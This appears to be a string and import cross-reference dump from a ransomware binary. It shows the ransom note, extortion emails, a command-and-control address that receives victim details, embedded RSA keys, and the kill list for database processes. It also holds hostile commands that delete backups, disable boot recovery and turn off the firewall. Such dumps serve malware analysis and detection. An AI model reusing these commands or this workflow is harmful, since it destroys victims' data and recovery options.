reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x406ac7	0x51dcc0	string	0x406a20	" not used
0x4073ca	0x51dcf4	string	0x407310	InputBuffer
0x40746c	0x51dcf4	string	0x407310	InputBuffer
0x407830	0x51dd18	string	0x4077e0	InputFileName
0x40785c	0x51dd3c	string	0x4077e0	InputBinaryMode
0x407952	0x51dd5c	string	0x4078f0	OutputFileNameWide
0x407971	0x51dd70	string	0x4078f0	OutputBinaryMode
0x407ad2	0x51dde8	string	0x407a90	CipherModeBase: feedback size cannot be specified for this cipher mode
0x407cd4	0x51ddac	string	0x407bf0	DecodingLookupArray
0x407d68	0x51dda0	string	0x407bf0	Log2Base
0x407fd1	0x51de34	string	0x407fa0	/GCM
0x408356	0x51dd84	string	0x408350	EncodingParameters
0x40875a	0x51ddc0	string	0x4085d0	InsertLineBreaks
0x408791	0x51ddd4	string	0x4085d0	MaxLineLength
0x408894	0x51de60	string	0x408820	C:\\Windows\
0x408e30	0x51dd28	string	0x408820	InputFileNameWide
0x408e66	0x51dd3c	string	0x408820	InputBinaryMode
0x408fcb	0x51de90	string	0x408820	
0x4096d3	0x51dec8	string	0x408820	Unhandled exception caught
0x40a299	0x51de90	string	0x40a0f0	
0x40ad19	0x51dec8	string	0x40a0f0	Unhandled exception caught
0x40af65	0x4fd120	import	0x40aed0	KERNEL32.dll.FindFirstFileW
0x40af78	0x51def4	string	0x40aed0	fuck
0x40b438	0x51df14	string	0x40aed0	IDk.txt
0x40b44f	0x51df24	string	0x40aed0	Decrypt-me.txt
0x40b4d5	0x51de60	string	0x40aed0	C:\\Windows\
0x40b4e8	0x51df44	string	0x40aed0	prvkey
0x40b71f	0x4fd14c	import	0x40aed0	KERNEL32.dll.lstrcmpW
0x40b792	0x4fd128	import	0x40aed0	KERNEL32.dll.FindNextFileW
0x40b7a1	0x4fd134	import	0x40aed0	KERNEL32.dll.FindClose
0x40bb25	0x4fd120	import	0x40ba90	KERNEL32.dll.FindFirstFileW
0x40bb38	0x51def4	string	0x40ba90	fuck
0x40c053	0x51de60	string	0x40ba90	C:\\Windows\
0x40c288	0x51df60	string	0x40ba90	threaad
0x40c2d3	0x51df60	string	0x40ba90	threaad
0x40c2f6	0x4fd14c	import	0x40ba90	KERNEL32.dll.lstrcmpW
0x40c369	0x4fd128	import	0x40ba90	KERNEL32.dll.FindNextFileW
0x40c378	0x4fd134	import	0x40ba90	KERNEL32.dll.FindClose
0x40c705	0x4fd120	import	0x40c670	KERNEL32.dll.FindFirstFileW
0x40c718	0x51def4	string	0x40c670	fuck
0x40cc33	0x51de60	string	0x40c670	C:\\Windows\
0x40ce6a	0x4fd14c	import	0x40c670	KERNEL32.dll.lstrcmpW
0x40cedd	0x4fd128	import	0x40c670	KERNEL32.dll.FindNextFileW
0x40ceec	0x4fd134	import	0x40c670	KERNEL32.dll.FindClose
0x40d275	0x4fd120	import	0x40d1e0	KERNEL32.dll.FindFirstFileW
0x40d288	0x51def4	string	0x40d1e0	fuck
0x40d7a3	0x51de60	string	0x40d1e0	C:\\Windows\
0x40d924	0x4fd14c	import	0x40d1e0	KERNEL32.dll.lstrcmpW
0x40d997	0x4fd128	import	0x40d1e0	KERNEL32.dll.FindNextFileW
0x40d9a6	0x4fd134	import	0x40d1e0	KERNEL32.dll.FindClose
0x40dd25	0x4fd120	import	0x40dc90	KERNEL32.dll.FindFirstFileW
0x40dd38	0x51def4	string	0x40dc90	fuck
0x40e19f	0x51de60	string	0x40dc90	C:\\Windows\
0x40e3c5	0x4fd14c	import	0x40dc90	KERNEL32.dll.lstrcmpW
0x40e438	0x4fd128	import	0x40dc90	KERNEL32.dll.FindNextFileW
0x40e447	0x4fd134	import	0x40dc90	KERNEL32.dll.FindClose
0x40e7c5	0x4fd120	import	0x40e730	KERNEL32.dll.FindFirstFileW
0x40e7d8	0x51def4	string	0x40e730	fuck
0x40ecf3	0x51de60	string	0x40e730	C:\\Windows\
0x40ef19	0x4fd14c	import	0x40e730	KERNEL32.dll.lstrcmpW
0x40ef8c	0x4fd128	import	0x40e730	KERNEL32.dll.FindNextFileW
0x40ef9b	0x4fd134	import	0x40e730	KERNEL32.dll.FindClose
0x40f325	0x4fd120	import	0x40f290	KERNEL32.dll.FindFirstFileW
0x40f338	0x51def4	string	0x40f290	fuck
0x40f846	0x51de60	string	0x40f290	C:\\Windows\
0x40fa6c	0x4fd14c	import	0x40f290	KERNEL32.dll.lstrcmpW
0x40fadf	0x4fd128	import	0x40f290	KERNEL32.dll.FindNextFileW
0x40faee	0x4fd134	import	0x40f290	KERNEL32.dll.FindClose
0x40fe2d	0x4fd11c	import	0x40fde0	KERNEL32.dll.GetLogicalDrives
0x40ff70	0x51df68	string	0x40ff40	sqlserver.exe
0x40ffaa	0x51df78	string	0x40ff40	msftesql.exe
0x40ffdb	0x51df88	string	0x40ff40	sqlagent.exe
0x41000c	0x51df98	string	0x40ff40	sqlbrowser.exe
0x41003d	0x51dfa8	string	0x40ff40	sqlwriter.exe
0x410065	0x51dfb8	string	0x40ff40	mysqld.exe
0x41008a	0x51dfc4	string	0x40ff40	mysqld-nt.exe
0x4100af	0x51dfd4	string	0x40ff40	mysqld-opt.exe
0x4100ec	0x4fd144	import	0x40ff40	KERNEL32.dll.CloseHandle
0x410104	0x4fd13c	import	0x40ff40	KERNEL32.dll.CreateToolhelp32Snapshot
0x41011e	0x4fd124	import	0x40ff40	KERNEL32.dll.Process32First
0x41016a	0x4fd138	import	0x40ff40	KERNEL32.dll.OpenProcess
0x410179	0x4fd12c	import	0x40ff40	KERNEL32.dll.TerminateProcess
0x410180	0x4fd144	import	0x40ff40	KERNEL32.dll.CloseHandle
0x41018a	0x4fd144	import	0x40ff40	KERNEL32.dll.CloseHandle
0x410198	0x4fd140	import	0x40ff40	KERNEL32.dll.Process32Next
0x41028c	0x4fd120	import	0x4101f0	KERNEL32.dll.FindFirstFileW
0x4104bd	0x4fd14c	import	0x4101f0	KERNEL32.dll.lstrcmpW
0x4104ef	0x51dfe8	string	0x4101f0	\Decrypt-me.txt
0x4106ce	0x4fd128	import	0x4101f0	KERNEL32.dll.FindNextFileW
0x4106dd	0x4fd134	import	0x4101f0	KERNEL32.dll.FindClose
0x410a5a	0x51e038	string	0x410a20	0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNMQWERTYUIOPASDFGHJKLZXCVBNM
0x410c09	0x51e094	string	0x410b50	C:\ProgramData\IDk.txt
0x410c4d	0x51e0ac	string	0x410b50	C:\ProgramData\pkey.txt
0x410e3f	0x51e0ac	string	0x410b50	C:\ProgramData\pkey.txt
0x410fa6	0x51e094	string	0x410b50	C:\ProgramData\IDk.txt
0x4110b1	0x51e0c4	string	0x410b50	C:\ProgramData
0x411151	0x51e0c4	string	0x410b50	C:\ProgramData
0x4111fb	0x51e00c	string	0x410b50	0123456789
0x41133b	0x51e018	string	0x410b50	QWERTYUIOPASDFGHJKLZXCVBNM
0x4116cc	0x51e094	string	0x410b50	C:\ProgramData\IDk.txt
0x411b17	0x51e0ac	string	0x410b50	C:\ProgramData\pkey.txt
0x411b46	0x51dd4c	string	0x410b50	OutputFileName
0x411b6b	0x51dd70	string	0x410b50	OutputBinaryMode
0x411c2b	0x51e0d8	string	0x410b50	MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEAsGrS8kdP2e/3+ZyE4LlHPOsYdJ7b2oU74QsNSO5uRdqjL44edustu0uThYvx4PyZRpPPQK2mSgMSm/E+Lp2nEhQBty2YKEIY3TE86AA2xGRmeyTyKmc7u6Lb4R6SwCFOUE4Dxk3X557yGCzT2+pNOVcMJw0Fz1yv7QXfTk67QBvp4kZFqNZVrgJLaq1+uioCTdkoOriJX5BcyDaUKS++i/vApT3lQ/znsdjRzZ5HKsVNG5vOuhHJe+jv21gXcAF4CM2S5qzDNJFnCmUA5YrYOryd0MetEy3GOokoNmYY3XOqr+LuQrRvbdF0F+r/BjhQ/lYphowbBQEhkOMsZcxk6wIBEQ==
0x411c5e	0x51e0d8	string	0x410b50	MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEAsGrS8kdP2e/3+ZyE4LlHPOsYdJ7b2oU74QsNSO5uRdqjL44edustu0uThYvx4PyZRpPPQK2mSgMSm/E+Lp2nEhQBty2YKEIY3TE86AA2xGRmeyTyKmc7u6Lb4R6SwCFOUE4Dxk3X557yGCzT2+pNOVcMJw0Fz1yv7QXfTk67QBvp4kZFqNZVrgJLaq1+uioCTdkoOriJX5BcyDaUKS++i/vApT3lQ/znsdjRzZ5HKsVNG5vOuhHJe+jv21gXcAF4CM2S5qzDNJFnCmUA5YrYOryd0MetEy3GOokoNmYY3XOqr+LuQrRvbdF0F+r/BjhQ/lYphowbBQEhkOMsZcxk6wIBEQ==
0x411c6f	0x51e268	string	0x410b50	MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEAuSwd6N3pkW2t2RhnOJZhXJnoJTvfi/sMxJrAPZAcVly7nKeMX85t26yp38l+e6dW9xUIyTDYfvgvurl6gnefiXCPHpjWyInGcyrJbycnG5uhNa74UBq0y37GTU50vXnaW4CVtf1mCbPC1DBcMLRUMdBrsaYPMPs5QpsiFfYBozQnymlY1UHPXbN8MXxfQ4tmpABiQJFZVNquaU8p4KoNAn3t6AaR4ArMY6vcDi+ZbwTZSYHLCozvRZSrU6i9TgD7wy5QEmZ280su9jL8ZX+ew4yMQpZFxkZ7fIzm2W21Aj7Gf8s+sNdm3B4NGEoewySptvvPT+WhSqtArfha5Zf1ewIBEQ==
0x411c80	0x51e3f8	string	0x410b50	MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEAuaV60MVKvEtIkBno5gv31O+Bq/YuINm/Nds9I2ILXPVXwIsHiA8eiUyXiu1dXk3VsuhdutLDfLh8Uw8eLO+pr1fxGStfeaYarKV10gU8iOG4r9Kr8DH5qyrIMC/Cj91wiYbMP+uW8DgJL4RWlDC5lMrSdXN/MYMzUTvyi7dWUYfEC+Oqf8MIl4xYYaIKfcyNE3KNPunjRbQoPKldQlNdCfz0Ml1inR8AmHribBSZh/vDAOdPIJ+EoG3RqO1gsdF4k3O8FvaMUrvEUe9BVASQPT/xM5MXxqyiKI7kwoEA8aWvXX9+a1IpoD9RnYhLnY8/kabVqRQC6xCgn+Fihnqz3QIBEQ==
0x411cd5	0x51e584	string	0x410b50	https://api.my-ip.io/ip
0x411e83	0x51e5a0	string	0x410b50	94.130.46.250
0x411f2e	0x51e5b0	string	0x410b50	/postme
0x411ff5	0x51e5bc	string	0x410b50	From
0x41210e	0x51e5dc	string	0x410b50	&ip=
0x412130	0x51e5d4	string	0x410b50	&disk=
0x4121e6	0x51e5cc	string	0x410b50	&id=
0x4122a0	0x51e5c4	string	0x410b50	&mail=
0x4128bf	0x51e5ec	string	0x410b50	C:\ProgramData\prvkey
0x4128cd	0x51e5e4	string	0x410b50	.txt
0x41294f	0x51e620	string	0x410b50	\n\nID=
0x412962	0x51e614	string	0x410b50	Disksize=
0x412990	0x51e60c	string	0x410b50	Mail=
0x4129c1	0x51e604	string	0x410b50	Ip=
0x412af7	0x51e5ec	string	0x410b50	C:\ProgramData\prvkey
0x412b05	0x51e5e4	string	0x410b50	.txt
0x412b59	0x51e628	string	0x410b50	.txt.key
0x412d38	0x51de90	string	0x410b50	
0x412f26	0x51e668	string	0x410b50	fuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyou
0x4139c8	0x4fd148	import	0x413890	KERNEL32.dll.FreeConsole
0x413a25	0x51e76c	string	0x413890	openthefile@mailfence.com
0x413a4a	0x51e788	string	0x413890	openthefile@tutanota.com
0x413a71	0x51e7bc	string	0x413890	.Extortionist
0x413b0f	0x51e7cc	string	0x413890	net stop MSDTC
0x413b19	0x51e7dc	string	0x413890	bcdedit /set {default} bootstatuspolicy ignoreallfailures
0x413b23	0x51e818	string	0x413890	bcdedit /set {default} recoveryenabled no
0x413b2d	0x51e844	string	0x413890	wbadmin delete catalog -quiet
0x413b37	0x51e864	string	0x413890	net stop SQLSERVERAGENT
0x413b41	0x51e87c	string	0x413890	net stop MSSQLSERVER
0x413b4b	0x51e894	string	0x413890	net stop vds
0x413b55	0x51e8a4	string	0x413890	netsh advfirewall set currentprofile state off
0x413b5f	0x51e8d4	string	0x413890	netsh firewall set opmode mode=disable
0x413b69	0x51e8fc	string	0x413890	net stop SQLWriter
0x413b73	0x51e910	string	0x413890	net stop SQLBrowser
0x413b7d	0x51e87c	string	0x413890	net stop MSSQLSERVER
0x413b87	0x51e924	string	0x413890	net stop MSSQL$CONTOSO1
0x413ba6	0x4fd2fc	import	0x413890	USER32.dll.BlockInput
0x413c05	0x4fd130	import	0x413890	KERNEL32.dll.GetDriveTypeA
0x413d88	0x4b0250	string	0x413890	WVS3
0x413d96	0x4b0250	string	0x413890	WVS3
0x413f36	0x51e970	string	0x413890	All Your Files Has Been Encrypted\n\nYou Have to Pay to Get Your Files Back\n\n1-Go to C:\ProgramData\ folder and send us prvkey*.txt.key file , * might be a number (like this : prvkey3.txt.key)\n\n2-You can send some file little than 1mb for Decryption test to trust us But the test File should not contain valuable data\n\n3-Payment should be with Bitcoin\n\n\n4-Changing Windows without saving prvkey.txt.key file will cause permanete Data loss\n\n\nOur Email:
0x413f69	0x51e93c	string	0x413890	\n\nin Case of no Answer:
0x414097	0x4140ad	string	0x413890	RQ袾\t blocks=Basic Latin,CJK Unified Ideographs
0x414163	0x4fd130	import	0x413890	KERNEL32.dll.GetDriveTypeA
0x4143f4	0x414406	string	0x413890	j\b螷\t blocks=Basic Latin,CJK Unified Ideographs
0x414565	0x4145b8	string	0x413890	RQ藹\t blocks=Basic Latin,CJK Unified Ideographs
0x41457b	0x4145b8	string	0x413890	RQ藹\t blocks=Basic Latin,CJK Unified Ideographs
0x41462b	0x51dec8	string	0x413890	Unhandled exception caught
0x41467a	0x4fd130	import	0x413890	KERNEL32.dll.GetDriveTypeA
0x41479e	0x4147b4	string	0x413890	RQ蛷\t blocks=Basic Latin,CJK Unified Ideographs
0x4148b9	0x51ed04	string	0x413890	Software\Microsoft\Windows\CurrentVersion\Policies\System
0x4148c3	0x4fd028	import	0x413890	ADVAPI32.dll.RegCreateKeyExA
0x4148d5	0x51ed40	string	0x413890	DisableTaskmgr
0x4148e0	0x4fd02c	import	0x413890	ADVAPI32.dll.RegSetValueExA
0x414980	0x414996	string	0x413890	RQ蹵\t blocks=Basic Latin,CJK Unified Ideographs
0x4149b7	0x4149cd	string	0x413890	QR肵\t blocks=Basic Latin,CJK Unified Ideographs
0x414a7b	0x414a91	string	0x413890	RQ辴\t blocks=Basic Latin,CJK Unified Ideographs
0x414ab5	0x414acb	string	0x413890	RQ脴\t blocks=Basic Latin,CJK Unified Ideographs
0x414b9b	0x51da68	string	0x413890	space
0x414c00	0x51e70c	string	0x413890	Unhandled exception\n
0x415157	0x415162	string	0x4150e0	3ɉN`Ɔ blocks=Basic Latin,Latin Extended-B
0x415a68	0x415a79	string	0x415a20	3ɉO` blocks=Basic Latin,Latin Extended-B
0x415a6e	0x415a79	string	0x415a20	3ɉO` blocks=Basic Latin,Latin Extended-B
0x415b2b	0x51dd00	string	0x415b20	SHA-1
0x415cb7	0x51ed50	string	0x415c80	OutputStringPointer
0x416796	0x4167aa	string	0x416730	QV襗\t blocks=Basic Latin,CJK Unified Ideographs
0x416ac7	0x416ad9	string	0x416a10	3ۋE\b blocks=Basic Latin,Arabic
0x417433	0x417437	string	0x417410	WPRQ
0x4178c5	0x4d31cd	string	0x417830	j\fh "S
0x417a1f	0x417a94	string	0x417830	RQ軄\t blocks=Basic Latin,CJK Unified Ideographs
0x417a35	0x417a94	string	0x417830	RQ軄\t blocks=Basic Latin,CJK Unified Ideographs
0x417f62	0x417f97	string	0x417e80	;O\fs
0x4197a4	0x4197af	string	0x419750	3ɉN` blocks=Basic Latin,Latin Extended-B
0x41a2ba	0x41a2cb	string	0x41a290	3ɉO` blocks=Basic Latin,Latin Extended-B
0x41a2c0	0x41a2cb	string	0x41a290	3ɉO` blocks=Basic Latin,Latin Extended-B
0x41afc3	0x51eeac	string	0x41af90	BufferedTransformation: this object doesn't allow input
0x41b123	0x51eeac	string	0x41b0f0	BufferedTransformation: this object doesn't allow input
0x41c881	0x41c870	string	0x41c7e0	;B\bu
0x41c9b0	0x51eee4	string	0x41c9b0	vector<T> too long
0x41d5cd	0x51de3c	string	0x41d580	MGF1
0x41d652	0x51dd00	string	0x41d580	SHA-1
0x41d870	0x51ef50	string	0x41d870	invalid string position
0x41de38	0x41de28	string	0x41de10	;P\bu\r
0x41e2c1	0x41e377	string	0x41e2b0	_^[]
0x41f10b	0x51dd08	string	0x41f0d0	FeedbackSize
0x41f501	0x51df54	string	0x41f390	shit
0x41fb37	0x51e63c	string	0x41fb30	C:\ProgramData\prvkey
0x421870	0x51ef68	string	0x421870	string too long
0x422077	0x51d998	string	0x421f70	false
0x422090	0x51d9a0	string	0x421f70	true
0x422d8c	0x51e724	string	0x422d80	C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\
0x423cd1	0x423ca0	string	0x423c60	;}\ftAf
0x423ce4	0x423ca0	string	0x423c60	;}\ftAf
0x424243	0x4fd4e0	string	0x424220	easy handle already used in multi handle
0x425ce7	0x4fd510	string	0x4244f0	SESS
0x425d27	0x4fd518	string	0x4244f0	FLUSH
0x425d51	0x4fd520	string	0x4244f0	RELOAD
0x425dbf	0x4fd528	string	0x4244f0	Set-Cookie:
0x4264a4	0x4264b9	string	0x4244f0	9Xht#
0x4264bc	0x4264e1	string	0x4244f0	9Xlt
0x427a61	0x4b0250	string	0x427a20	WVS3
0x427bd9	0x4fd710	string	0x427a20	Internal error removing splay node = %d\n
0x427c73	0x4fd73c	string	0x427c30	Internal error clearing splay node = %d\n
0x427d3c	0x427d71	string	0x427d00	][^_Y
0x427e70	0x4fd3c4	import	0x427d80	WS2_32.dll.closesocket
0x4282cf	0x4fd354	import	0x427f20	WS2_32.dll.recv
0x428376	0x428097	string	0x427f20	]_^[
0x4288fd	0x4fd3c4	import	0x428830	WS2_32.dll.closesocket
0x42a71a	0x42a789	string	0x42a6b0	3\t\a3
0x42a724	0x42a789	string	0x42a6b0	3\t\a3
0x42a751	0x42a789	string	0x42a6b0	3\t\a3
0x42a8ba	0x42a8b0	string	0x42a7c0	;(t\rA
0x42ac2f	0x42b2e9	string	0x42ab90	j\nhl
0x42acaa	0x4fd798	string	0x42ab90	%4095[^;\r\n=] =%4095[^;\r\n]
0x42adca	0x4fd7e8	string	0x42ab90	__Secure-
0x42ade8	0x4fd7f4	string	0x42ab90	__Host-
0x42ae41	0x4fd7fc	string	0x42ab90	secure
0x42ae77	0x4fd804	string	0x42ab90	httponly
0x42aea1	0x4fd810	string	0x42ab90	path
0x42aeee	0x4fd818	string	0x42ab90	domain
0x42af18	0x4fd78c	string	0x42ab90	localhost
0x42aff9	0x4fd824	string	0x42ab90	skipped cookie with bad tailmatch domain: %s\n
0x42b04b	0x4fd854	string	0x42ab90	version
0x42b076	0x4fd85c	string	0x42ab90	max-age
0x42b0a1	0x4fd864	string	0x42ab90	expires
0x42b147	0x447030	string	0x42ab90	QSUVW
0x42b16e	0x4fd7b4	string	0x42ab90	oversized cookie dropped, name/val %zu + %zu bytes\n
0x42bb36	0x42be31	string	0x42bb10	_^]3
0x42bb42	0x42be31	string	0x42bb10	_^]3
0x42bef0	0x42bf41	string	0x42bec0	_^]3
0x42bef4	0x4fd8d8	string	0x42bec0	none
0x42bf32	0x42bf41	string	0x42bec0	_^]3
0x42bf36	0x42bf41	string	0x42bec0	_^]3
0x42c003	0x4fd528	string	0x42bec0	Set-Cookie:
0x42c065	0x42c000	string	0x42bec0	j\vVh(
0x42c11d	0x4fd8d8	string	0x42c0b0	none
0x42c174	0x4fd768	string	0x42c0b0	ignoring failed cookie_init for %s\n
0x42c195	0x42c1f1	string	0x42c0b0	3ۋ|$ blocks=Basic Latin,Arabic
0x42c1dd	0x42c1f1	string	0x42c0b0	3ۋ|$ blocks=Basic Latin,Arabic
0x42c23b	0x4fd528	string	0x42c0b0	Set-Cookie:
0x42c35e	0x4fd9c0	string	0x42c310	WARNING: failed to save cookies in %s\n
0x42c4c3	0x4fd904	string	0x42c3f0	%s.%s.tmp
0x42c50d	0x4fd918	string	0x42c3f0	# Netscape HTTP Cookie File\n# https://curl.haxx.se/docs/http-cookies.html\n# This file was generated by libcurl! Edit at your own risk.\n\n
0x42c5fc	0x4fd9a4	string	0x42c3f0	#\n# Fatal libcurl error\n
0x42c8bf	0x51db00	string	0x42c8b0	unknown
0x42c904	0x4fd884	string	0x42c8b0	FALSE
0x42c90d	0x4fd87c	string	0x42c8b0	TRUE
0x42c927	0x4fd86c	string	0x42c8b0	#HttpOnly_
0x42c93c	0x4fd8e8	string	0x42c8b0	%s%s%s\t%s\t%s\t%s\t%I64d\t%s\t%s
0x42cc72	0x4fd158	import	0x42cb50	KERNEL32.dll.InitializeCriticalSectionEx
0x42ccbe	0x4fda18	string	0x42cb50	getaddrinfo() thread failed to start\n
0x42cea4	0x4fd150	import	0x42ce70	KERNEL32.dll.EnterCriticalSection
0x42ceb0	0x4fd154	import	0x42ce70	KERNEL32.dll.LeaveCriticalSection
0x42d0cc	0x4fd150	import	0x42d0b0	KERNEL32.dll.EnterCriticalSection
0x42d0df	0x4fd154	import	0x42d0b0	KERNEL32.dll.LeaveCriticalSection
0x42d12c	0x4fd3c4	import	0x42d0b0	WS2_32.dll.closesocket
0x42d15c	0x4fd15c	import	0x42d150	KERNEL32.dll.DeleteCriticalSection
0x42d192	0x4fd3c4	import	0x42d150	WS2_32.dll.closesocket
0x42d298	0x4fd9ec	string	0x42d290	proxy
0x42d29d	0x4fd9f4	string	0x42d290	host
0x42d2b9	0x4fd9fc	string	0x42d290	Could not resolve %s: %s
0x42da9a	0x42dae5	string	0x42da90	_^]3
0x42db86	0x4fdd24	string	0x42db40	Content-Type
0x42dbc2	0x4fdd8c	string	0x42db40	multipart/mixed
0x42dbee	0x4fdd9c	string	0x42db40	application/octet-stream
0x42dc1c	0x4fdcc8	string	0x42db40	text/plain
0x42dc3b	0x4fddb8	string	0x42db40	Content-Disposition
0x42dc78	0x4fddcc	string	0x42db40	multipart/
0x42dc8e	0x4fddd8	string	0x42db40	attachment
0x42dc97	0x4fddd8	string	0x42db40	attachment
0x42dca7	0x42dcb7	string	0x42db40	9|$$
0x42dcac	0x42dcb7	string	0x42db40	9|$$
0x42dd2a	0x4fdde8	string	0x42db40	; filename="
0x42dd3f	0x4fddf8	string	0x42db40	; name="
0x42dd4f	0x4fde04	string	0x42db40	Content-Disposition: %s%s%s%s%s%s%s
0x42dd92	0x4fdd68	string	0x42db40	; boundary=
0x42dd9c	0x4fdd74	string	0x42db40	Content-Type: %s%s%s
0x42ddbb	0x4fde28	string	0x42db40	Content-Transfer-Encoding
0x42ddef	0x4fdc40	string	0x42db40	8bit
0x42ddf5	0x4fde44	string	0x42db40	Content-Transfer-Encoding: %s
0x42de38	0x4fde64	string	0x42db40	multipart/form-data
0x42de4d	0x4fde78	string	0x42db40	form-data
0x42df4a	0x4fdd48	string	0x42dee0	Can't add itself as a subpart!
0x42e039	0x4fdd24	string	0x42dfa0	Content-Type
0x42e559	0x4fde90	string	0x42e540	----------------%ld%s
0x42e67b	0x4fdd48	string	0x42e610	Can't add itself as a subpart!
0x42eb35	0x4fdd40	string	0x42ea50	--\r\n
0x42eda2	0x4fdd24	string	0x42ecc0	Content-Type
0x42edd5	0x42eda0	string	0x42ecc0	j\fh$
0x42f035	0x42f055	string	0x42efd0	j\fh$
0x42f057	0x4fdd24	string	0x42efd0	Content-Type
0x42fd60	0x4fdea8	string	0x42fce0	Connection cache is full, closing the oldest one.\n
0x42ff1d	0x42ff14	string	0x42ff00	90t\f
0x4302cd	0x430419	string	0x430280	_^]2
0x430518	0x4fdff8	string	0x4304d0	sha256//
0x430566	0x43093a	string	0x4304d0	_][^
0x4305a1	0x4fe004	string	0x4304d0	\t public key hash: sha256//%s\n
0x430600	0x4fe024	string	0x4304d0	;sha256//
0x430687	0x4fdff8	string	0x4304d0	sha256//
0x430805	0x4fdfc0	string	0x4304d0	-----BEGIN PUBLIC KEY-----
0x430832	0x4fdfdc	string	0x4304d0	\n-----END PUBLIC KEY-----
0x430b5c	0x430b89	string	0x430950	_^]3
0x430e8b	0x4fdf84	string	0x430e40	CURL_SSLVERSION_MAX incompatible with CURL_SSLVERSION
0x430edf	0x4fdf48	string	0x430e40	Unrecognized parameter value passed via CURLOPT_SSLVERSION
0x430f4b	0x4fdf84	string	0x430f00	CURL_SSLVERSION_MAX incompatible with CURL_SSLVERSION
0x430f9f	0x4fdf48	string	0x430f00	Unrecognized parameter value passed via CURLOPT_SSLVERSION
0x431401	0x431408	string	0x4310d0	_^]2
0x43176b	0x4fe040	string	0x431740	CURL_SSL_BACKEND
0x4318ff	0x43191d	string	0x431870	2\bD$
0x431908	0x43191d	string	0x431870	2\bD$
0x431914	0x43191d	string	0x431870	2\bD$
0x431956	0x4fe188	string	0x431870	serially
0x43195b	0x4fe178	string	0x431870	can multiplex
0x431969	0x4fe194	string	0x431870	Found bundle for host %s: %p [%s]\n
0x43198d	0x4fe1b8	string	0x431870	Server doesn't support multiplex yet, wait\n
0x4319a9	0x4321ce	string	0x431870	_^]2
0x4319c4	0x4fe1e4	string	0x431870	Server doesn't support multiplex (yet)\n
0x4319ee	0x4fe20c	string	0x431870	Could multiplex, but not asked to!\n
0x431a07	0x4fe230	string	0x431870	Can not multiplex, even if we wanted to!\n
